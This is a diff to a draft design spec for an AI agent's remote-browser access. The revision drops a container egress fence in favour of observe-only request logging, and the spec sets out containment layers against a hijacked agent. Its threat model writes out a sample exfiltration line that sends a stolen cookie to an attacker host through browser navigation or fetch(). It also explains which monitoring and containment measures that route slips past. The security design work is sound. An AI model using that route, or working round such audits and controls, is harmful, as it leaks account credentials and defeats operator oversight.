@@ -4,6 +4,18 @@ Status: draft. Builds on spec 0001 (doors, the porch, the hostile-mind
 doctrine), spec 0002 (per-agent bearers, the vault), and spec 0003 (the
 umbilical, the ops gateway, per-wake sub-caps).
 
+**Revision (post-MVP): the container egress FENCE is removed.** A
+web-capable container launched with a deny-by-default `allowedHosts`
+allowlist, but the fence never closed the real hole (a hijacked mind
+exfiltrates through the REMOTE browser regardless, the irreducible
+residual below), and it stopped the agent from the ordinary work of
+looking things up and pulling packages. So it is burden without benefit.
+Egress is now OBSERVE-ONLY: every outbound request the container makes
+is intercepted, logged, and forwarded, for later analysis, and nothing
+is blocked. The passages below that describe the fence as an active
+boundary are superseded by this and section 8; they are kept for the
+reasoning, not the mechanism.
+
 ## 1. The problem
 
 The mind's "browsing" today is WebFetch and curl: plain HTTP, no
@@ -58,24 +70,16 @@ Cloudflare API token that reaches Browser Run.
 
 Each `WebSession` DO:
 
-- **Opens (into an already-fenced container)**: the egress fence is
-  NOT raised by this DO, and could not be, `allowedHosts` belongs to
-  the `WakeContainer` (the scheduler-side supervisor), across the
-  umbilical from browser-gk, with no control path back. Instead a
-  web-capable agent's container is launched WITH the fence already in
-  force (section 5): there is no unfenced window to close because the
-  container never runs unfenced. So open simply dials
-  `wss://api.cloudflare.com/.../browser-rendering/
+- **Opens**: dials `wss://api.cloudflare.com/.../browser-rendering/
   devtools/browser?keep_alive=600000&recording=true` with the
   Worker-held API token and restores the saved storage state (CDP
   `Storage.setCookies` + an init script for localStorage). The values
   stay in browser-gk and Browser Run and never enter the container, so
-  door-egress of an extracted value is bounded by where doors go, not
-  by a value sweep (section 5, layer two). browser-gk can rely
-  on the fence because the scheduler only wires the web door (the
-  BROWSER binding, the `web` option) for agents whose container is
-  launched fenced; a web upgrade cannot reach browser-gk from an
-  unfenced container.
+  door-egress of an extracted value is bounded by where doors go
+  (section 5, layer two). Container egress is AUDITED, not fenced
+  (section 8, revision note): the browser is the real exfil path, so a
+  fence bought nothing. The web door is wired (the BROWSER binding, the
+  `web` option) only for web-capable agents.
 - **Relays**: pipes CDP frames both ways between the container side and
   Browser Run. The relay is transparent to clients and is where all
   policy lives.
@@ -175,8 +179,13 @@ carry them off. Two layers:
   cookie VALUES into the container, which is the leak. So the container
   never learns the cookie value, and the containment for the value the
   mind DID extract is where the doors GO, not a value sweep:
-  - Direct egress is closed by the launch fence (this section, the
-    egress bullet). This is the primary boundary.
+  - Direct egress is AUDITED, not blocked (section 8): the fence was
+    removed (see the revision note at the top), so an extracted value
+    can leave the container over ordinary egress, and the record is the
+    containment, not prevention. This is deliberate: the remote browser
+    is an open exfil path anyway (the irreducible residual below), so
+    blocking direct egress bought nothing and cost the agent its normal
+    lookups and installs.
   - `notify` lands in front of the OPERATOR; `email` is held and
     swept; `PR` targets an allowlisted repo under operator review; so a
     credential shoved through one of those reaches the operator or a
@@ -192,24 +201,27 @@ carry them off. Two layers:
 
 ### The remote browser is itself an open-web egress path (irreducible)
 
-The container fence and the door bounds above are about the CONTAINER.
-The browser is remote and on the open web BY DESIGN, so a mind that has
-read a cookie via `Runtime.evaluate` can also make the BROWSER carry it
-out: `Page.navigate("https://attacker/?c=<cookie>")`, or a `fetch()`
-inside an `evaluate`. `allowedHosts` never sees this; it is Browser
-Run's own egress. This is the confused-deputy limit restated (spec 0003
+The door bounds above are about the CONTAINER. The browser is remote
+and on the open web BY DESIGN, so a mind that has read a cookie via
+`Runtime.evaluate` can make the BROWSER carry it out:
+`Page.navigate("https://attacker/?c=<cookie>")`, or a `fetch()` inside
+an `evaluate`. Nothing on the container side sees this; it is Browser
+Run's own egress. This is the very reason the container fence was not
+worth keeping: the exfil path it left open is the dominant one. This is the confused-deputy limit restated (spec 0003
 section 5): a hostile mind wielding the agent's own legitimate browser
 cannot be stopped by a network boundary, only bounded and observed. The
 layers, honestly labelled as bound-and-detect, not prevent:
 - **Bulk export is blocked**: the credential-export CDP methods are
   dropped, so the mind cannot dump the whole cookie jar or the passkeys
   in one call; it is reduced to whatever a single `evaluate` reads.
-- **Scoped sessions are fenced at the platform**: a session whose work
-  is one site (`x-account`, `github`) is opened with Browser Run
-  `allowedDomainSets` pinned to that site's domains, so the REMOTE
-  browser itself cannot reach an attacker origin. Only an open-ended
-  `research` session is unfenced, and that is the case the next layers
-  cover.
+- **Scoped sessions are fenced at the platform** (this is about the
+  REMOTE browser, not the container): a session whose work is one site
+  (`x-account`, `github`) is opened with Browser Run `allowedDomainSets`
+  pinned to that site's domains, so the remote browser itself cannot
+  reach an attacker origin. Only an open-ended `research` session is
+  unpinned, and that is the case the next layers cover. This is the one
+  place a domain allowlist still earns its keep, because it fences the
+  browser (the exfil path), not the container (which never was).
 - **The relay checks navigation**: `Page.navigate` targets are matched
   against the origin denylist; a deployment that wants to harden an
   open-ended session can run it denylist-heavy or, in the extreme,
@@ -473,43 +485,28 @@ interception machinery closes that gap:
   same for TLS once the image trusts the Cloudflare containers CA,
   which is the identical CA-trust step the phase-2 mind-credential
   injection already requires. One piece of machinery, two consumers.
-- Volume demands tiers: a single npm install is thousands of
-  requests. Per-request rows go to R2 as batched JSONL (permanent,
-  greppable offline: method, host, path, status, bytes, timestamp);
-  the ledger/chronicle gets per-wake aggregates (distinct hosts,
-  request counts, first sight of a never-before-seen host, which is
-  the interesting security signal).
-- Interception observes and logs by default, and the GENERAL egress
-  allow/deny policy stays a separate later decision so the audit can
-  ship without arguing about what to block for ordinary traffic (npm,
-  git, an API the agent legitimately calls).
-- The ONE exception, a hard precondition of the web door, is a web
-  session's lifetime. BLOCKING and CONTENT-LOGGING are different
-  primitives with different prerequisites:
-  - Blocking is the container's `allowedHosts` deny-by-default
-    allowlist (SNI-level, so HTTPS is covered with no CA-trust). This
-    ships in the web door MVP: outbound is allowed only to the minimal
-    wake infra (the mind endpoint, npm, GitHub, and, only when `operon
-    web expose` runs, Cloudflare's fixed argotunnel INGRESS edge that
-    `cloudflared` dials, never `*.trycloudflare.com`, which is the
-    remote browser's public hostname and would be an attacker-tunnel
-    sink). The argotunnel ingress is a tunnel TRANSPORT, not an HTTP
-    endpoint, so it is not itself an exfil sink. Never an agent-owned
-    publish host (reached through the publish door, not egress) and
-    never a browsing target (browsing is remote). The fence is a LAUNCH
-    property of the container, owned by the `WakeContainer` supervisor
-    that owns `allowedHosts`: a web-capable agent's container is started
-    WITH the deny-by-default allowlist already in force, for the whole
-    wake. This is why there is no cross-worker raise/confirm path to
-    define and no first-open window: the container never runs unfenced,
-    so `allowedHosts` predates any session. It is wake-scoped by
-    construction (a container is one wake) and never lowered mid-wake.
-    Non-web agents launch unfenced exactly as today. No real account is
-    created before this exists.
-  - Content-logging every request (this section's JSONL/aggregates)
-    over `interceptOutboundHttps` needs the CA-trust image change and
-    stays phase 5. Losing the log for non-web traffic is not a
-    credential leak; the block already stands.
+- The interceptor is a loopback `EgressAudit` WorkerEntrypoint on the
+  `WakeContainer` (via `ctx.exports`, delivering agent + wake id as
+  `ctx.props`), pointed at by `interceptOutboundHttps("*")`. It runs in
+  the Workers runtime OUTSIDE the container, so the log is unforgeable
+  by the container. HTTPS interception needs the container to trust the
+  platform's per-instance CA (placed at `/etc/cloudflare/certs`); the
+  entrypoint trusts it at startup (system store for curl/git,
+  `NODE_EXTRA_CA_CERTS` for node), the same CA-trust the phase-2
+  mind-credential injection also needs.
+- Each request logs one compact JSON line (`method`, `host`, `path`,
+  query LENGTH only since a query string can carry secrets, `status`,
+  agent + wake id) via `console`, which Workers observability captures
+  and makes queryable. Volume is high (an npm install is thousands of
+  requests), which is why the line is compact and the sink is
+  observability rather than a DO; batched R2 JSONL for longer retention
+  is a later add.
+- OBSERVE-ONLY, and FAIL-OPEN: the interceptor logs and forwards, and a
+  logging failure never blocks the request. Nothing is blocked, because
+  (revision note, top) the fence was removed: the browser is the real
+  exfil path, so blocking direct egress was burden without benefit. An
+  allow/deny egress POLICY remains a possible future knob, deliberately
+  separate from the audit.
 
 ## 9. Costs
 
@@ -553,29 +550,23 @@ are the meter to watch before loosening anything.
    context's origin, origin denylist + `allowedDomainSets`),
    storage-state persistence,
    recording archived to R2 on close, the concurrency + minute caps,
-   **web-session egress enforcement** (deny-by-default outbound while a
-   session is open via the container's SNI-level `allowedHosts`
-   allowlist of door + infra hosts only, which blocks HTTPS with no
-   CA-trust needed, section 5 layer two; browsing is remote and never
-   on this list; distinct from the full-container CONTENT audit of
-   phase 5 that does need TLS interception), `operon web
-   open|sessions|close`, chrome-devtools-mcp staged into the harness,
-   ops routes (list + history + delete). The sweep, the method filter,
-   AND the egress fence are NOT a later hardening pass: the first live
-   account must be created on a swept, filtered, egress-fenced pipe.
+   `operon web open|sessions|close`, chrome-devtools-mcp staged into
+   the harness, ops routes (list + history + delete). The sweep and the
+   method filter are NOT a later hardening pass: the first live account
+   must be created on a swept, filtered pipe. (Container egress is
+   audited, not fenced, section 8.)
 3. **Signup flow proven** (the proof those controls work): the agent
    creates one real account end to end (email verification via the
    email door, password minted door-side into the vault, or a passkey),
    operator watches via live view.
 4. **Polish**: live-view link in a notify action, tunnel-based local
    testing (`operon web expose`), passkey enrollment path.
-5. **General egress audit** (section 8): full-container request
-   logging for ALL traffic (npm, git, ordinary API calls) over
-   `interceptAllOutboundHttp`, HTTPS included once the CA-trust image
-   change (shared with mind-credential injection) lands. This is the
-   broad observe-then-policy pass; the web session's own deny-by-
-   default fence already shipped in MVP, so no real account is ever
-   created before egress is fenced.
+5. **Egress audit** (section 8): full-container request logging for ALL
+   traffic (npm, git, ordinary API calls) over
+   `interceptOutboundHttps("*")`, observe-only and fail-open, once the
+   startup CA-trust (shared with mind-credential injection) is in place.
+   This REPLACES the removed fence: the record, not a block, is the
+   containment for direct egress.
 
 ## 11. What this does NOT do
 
